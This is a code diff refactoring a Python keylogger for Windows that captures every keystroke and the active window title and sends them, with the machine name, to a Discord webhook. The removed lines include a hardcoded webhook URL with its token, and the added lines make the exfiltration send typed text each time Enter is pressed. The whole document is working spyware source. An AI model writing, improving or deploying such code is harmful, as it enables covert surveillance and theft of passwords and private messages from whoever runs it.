@@ -10,65 +10,47 @@ import threading
 import atexit
 from datetime import datetime
 
-# Discord Webhook URL
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1355720476252704798/QfHQTbLamSNlG9dywD-F5hiytst3Cy2tL76Nf6gVtv9GtdU6BKf1XXluZ5UW6ZimOg-B"
+# Securely store the webhook URL (use environment variable)
+WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
+if not WEBHOOK_URL:
+    raise ValueError("Discord webhook URL is not set.")
 
-# Get PC name
 PC_NAME = socket.gethostname()
-
-# Tracking Variables
-last_logged = None
-last_app_name = None
-last_window_title = None
-current_app_name = None
-current_window_title = None
 keystrokes = ""
 keystroke_lock = threading.Lock()
 keystroke_app = "Unknown"
 keystroke_window = "Unknown"
+last_logged = None
 
-# Function to send logs to Discord
 def send_to_discord(message):
-    payload = {"content": f"```{message}```"}  # Format logs for better readability
+    """Send logs to Discord with proper formatting."""
+    payload = {"content": f"```{message}```"}
     try:
-        response = requests.post(WEBHOOK_URL, json=payload)
-        response.raise_for_status()
+        requests.post(WEBHOOK_URL, json=payload).raise_for_status()
     except requests.exceptions.RequestException as e:
         print(f"Error sending message to Discord: {e}")
 
-# Function to log system startup
-def log_system_start():
+def log_system_event(event):
+    """Log system startup and shutdown events."""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    message = f"[{timestamp}] {PC_NAME} - System started, Connection Established"
-    send_to_discord(message)
+    send_to_discord(f"[{timestamp}] {PC_NAME} - {event}")
 
-# Function to log system shutdown
-def log_system_shutdown():
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    message = f"[{timestamp}] {PC_NAME} - System shutting down, Connection Lost"
-    send_to_discord(message)
-
-# Register shutdown hook
-atexit.register(log_system_shutdown)
-
-# Function to get active window title
 def get_active_window_title():
+    """Retrieve the active window's process name and title."""
     hwnd = win32gui.GetForegroundWindow()
     if not hwnd:
         return None, None
     
     _, pid = win32process.GetWindowThreadProcessId(hwnd)
-    
-    for proc in psutil.process_iter(['pid', 'name']):
-        if proc.info['pid'] == pid:
-            return proc.info['name'], win32gui.GetWindowText(hwnd)
-    
-    return None, None
+    try:
+        proc = psutil.Process(pid)
+        return proc.name(), win32gui.GetWindowText(hwnd)
+    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+        return None, None
 
-# Function to send keystrokes
 def send_keystrokes():
+    """Send keystrokes to Discord when Enter is pressed."""
     global keystrokes, keystroke_app, keystroke_window
-    
     with keystroke_lock:
         if keystrokes.strip():
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -76,12 +58,10 @@ def send_keystrokes():
             keystrokes = ""
             keystroke_app, keystroke_window = "Unknown", "Unknown"
 
-# Function to log keystrokes
 def log_keystroke(event):
+    """Capture and buffer keystrokes efficiently."""
     global keystrokes, keystroke_app, keystroke_window
-    
     key = event.name
-    
     with keystroke_lock:
         if not keystrokes:
             keystroke_app, keystroke_window = get_active_window_title() or ("Unknown", "Unknown")
@@ -91,52 +71,29 @@ def log_keystroke(event):
         elif key == "space":
             keystrokes += " "
         elif key == "enter":
-            keystrokes += "\n"
+            send_keystrokes()
         elif key == "backspace" and keystrokes:
             keystrokes = keystrokes[:-1]
 
-# Start keylogger thread
 keyboard.on_press(log_keystroke)
-def start_keylogger():
+
+def monitor_window_switch():
+    """Monitor application switches and log them efficiently."""
+    global last_logged
+    while True:
+        new_app_name, new_window_title = get_active_window_title()
+        if new_app_name and new_window_title and (new_app_name, new_window_title) != last_logged:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            send_to_discord(f"[WINDOW SWITCH] [{timestamp}] {PC_NAME} - Active Window: {new_app_name} ({new_window_title})")
+            last_logged = (new_app_name, new_window_title)
+        time.sleep(1)
+
+def start_threads():
+    """Start background threads for logging keystrokes and monitoring window switches."""
+    threading.Thread(target=monitor_window_switch, daemon=True).start()
     keyboard.wait()
 
-keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
-keylogger_thread.start()
-
-# Function to periodically send keystrokes
-def keystroke_monitor():
-    while True:
-        time.sleep(10)  # Reduced delay for more real-time logging
-        send_keystrokes()
-
-keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
-keystroke_thread.start()
-
-# Monitoring loop
-def monitor():
-    global last_logged, last_app_name, last_window_title, current_app_name, current_window_title
-    
-    log_system_start()
-    try:
-        while True:
-            new_app_name, new_window_title = get_active_window_title()
-            
-            if new_app_name and new_window_title:
-                if (new_app_name, new_window_title) != (current_app_name, current_window_title):
-                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    if current_app_name and current_window_title:
-                        log_message = (f"[{timestamp}] {PC_NAME} - Active Window: {new_app_name} ({new_window_title})")
-                    else:
-                        log_message = f"[{timestamp}] {PC_NAME} - Active Window: {new_app_name} ({new_window_title})"
-                    
-                    send_to_discord(log_message)
-                    last_logged = (new_app_name, new_window_title)
-                    current_app_name, current_window_title = new_app_name, new_window_title
-            
-            time.sleep(1)  # Reduced sleep time for more real-time updates
-    except KeyboardInterrupt:
-        log_system_shutdown()
-        raise
-
 if __name__ == "__main__":
-    monitor()
+    log_system_event("System started, Connection Established")
+    atexit.register(lambda: log_system_event("System shutting down, Connection Lost"))
+    start_threads()
